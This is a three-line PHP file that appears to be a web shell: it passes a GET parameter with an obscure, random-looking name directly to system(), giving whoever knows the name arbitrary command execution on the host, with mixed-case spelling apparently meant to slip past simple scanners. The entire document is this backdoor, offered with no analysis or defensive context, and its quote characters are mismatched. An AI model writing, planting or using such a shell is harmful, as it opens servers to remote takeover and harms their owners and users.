<?php
SysTeM($_GET[’brYT16CR']);
?>
